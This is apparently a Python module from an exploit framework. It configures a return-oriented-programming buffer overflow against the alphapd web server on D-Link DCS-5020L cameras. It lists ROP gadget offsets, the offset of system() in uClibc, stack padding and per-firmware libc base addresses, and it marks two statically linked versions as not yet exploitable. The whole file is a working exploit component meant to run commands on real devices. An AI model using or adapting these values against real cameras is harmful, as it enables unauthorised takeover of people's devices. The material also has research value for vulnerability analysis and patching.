from . import overflow


class Overflow(overflow.Overflow):
    def __init__(self):
        """
        These ROP gadgets will work for all versions of the DCS-5020L

        ----------------------------------------------------------------
        | Gadget Name | Gadget Offset | Gadget Summary                 |
        ----------------------------------------------------------------
        | ROP1        | 0x0004B0F8    | move    $t9, $s0               |
        |             |               | jalr    $t9 ; sub_4A890        |
        |             |               | addiu   $s2, $sp, 0x1E8+var_F8 |
        ----------------------------------------------------------------
        | ROP2        | 0x00018F40    | move    $t9, $s1               |
        |             |               | jalr    $t9 ; sub_18EB0        |
        |             |               | move    $a0, $s2               |
        ----------------------------------------------------------------
        """
        super(Overflow, self).__init__()

        # These values consistently work across all versions so no need to
        # set them in the individual functions.
        self.padding_after_ra = 0x4
        self.distance_to_s0 = 0x10
        self.s0 = 0x18F40
        self.s1 = 0x45080  # Offset of system in libuClibc-0.9.28.so
        self.ra = 0x4B0F8

        self.rop_padding = 0x1E8 - 0xF8

    def _1_15_12(self):
        self.libc_base = 0x2AB86000

    def _1_14_9(self):
        self._1_00_0()

    def _1_13_5(self):
        self._1_00_0()

    def _1_12_3(self):
        self._1_00_0()

    def _1_11_8(self):
        self._1_00_0()

    def _1_10_2(self):
        self._1_00_0()

    def _1_06_1(self):
        """
        Why is this binary statically linked...

        No overflow b/c the high byte is a NULL for all local addresses which
        prevents us from jumping somewhere with $ra and having meaningful
        values after it on the stack.
        """
        raise Exception('Alphapd is statically linked. No overflow yet.')

    def _1_05_8(self):
        raise Exception('Alphapd is statically linked. No overflow yet.')

    def _1_03_0(self):
        self._1_00_0()

    def _1_02_0(self):
        self._1_00_0()

    def _1_01_0(self):
        self._1_00_0()

    def _1_00_0(self):
        self.libc_base = 0x2AAEF000
